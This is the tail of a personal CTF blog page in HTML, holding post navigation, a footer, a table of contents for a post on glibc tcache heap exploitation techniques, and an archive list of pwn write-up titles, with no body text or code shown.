                <a href="/2022/04/17/LCTF2018%20PWN%20easy_heap/" title="LCTF2018 easy_heap">
                    <div class="nextTitle">LCTF2018 easy_heap</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2022/04/07/libc-2.26/" title="libc 2.26">
                    <div class="prevTitle">libc 2.26</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCache%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">TCache机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">数据结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BE%E5%85%A5%E5%A0%86%E5%9D%97"><span class="toc-number">1.2.1.</span> <span class="toc-text">放入堆块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">安全性分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-17426"><span class="toc-number">1.3.1.</span> <span class="toc-text">CVE-2017-17426</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E6%A3%80%E6%9F%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">二次释放检查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn-tcache"><span class="toc-number">1.4.</span> <span class="toc-text">pwn tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">1.4.1.</span> <span class="toc-text">tcache poisoning</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tcache-house-of-spirit"><span class="toc-number">1.4.2.</span> <span class="toc-text">tcache house of spirit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#smallbin-unlink"><span class="toc-number">1.4.3.</span> <span class="toc-text">smallbin unlink</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tcache-stashing-unlink-attack"><span class="toc-number">1.4.4.</span> <span class="toc-text">tcache stashing unlink attack</span></a></li></ol></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 24
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2022 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/17</span>
            <a class="archive-post-title" href="/2022/04/17/LCTF2018%20PWN%20easy_heap/">LCTF2018 easy_heap</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/08</span>
            <a class="archive-post-title" href="/2022/04/08/tcache/">tcache</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/07</span>
            <a class="archive-post-title" href="/2022/04/07/libc-2.26/">libc 2.26</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/07</span>
            <a class="archive-post-title" href="/2022/04/07/house-of-storm/">house of storm</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span>
            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/19</span>
            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span>
            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/16</span>
            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/15</span>
            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/15</span>
            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/13</span>
            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/12</span>
            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/09</span>
            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
                <span class="iconfont-archer">&#xe606;</span>
                unsorted bin attack
            </span>
        
            <span class="sidebar-tag-name" data-tags="pwn">
                <span class="iconfont-archer">&#xe606;</span>
                pwn
            </span>
        
            <span class="sidebar-tag-name" data-tags="house of spirit">
                <span class="iconfont-archer">&#xe606;</span>
                house of spirit
            </span>
        
            <span class="sidebar-tag-name" data-tags="fastbin doule free">
                <span class="iconfont-archer">&#xe606;</span>
                fastbin doule free
            </span>
        
            <span class="sidebar-tag-name" data-tags="os">
                <span class="iconfont-archer">&#xe606;</span>
                os
            </span>
        
            <span class="sidebar-tag-name" data-tags="tcache">
                <span class="iconfont-archer">&#xe606;</span>
                tcache
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="Diary">
            <span class="iconfont-archer">&#xe60a;</span>
            Diary
        </span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMeta = {
        root: "/",
        author: "John Doe"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20210823"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20210823"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20210823" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
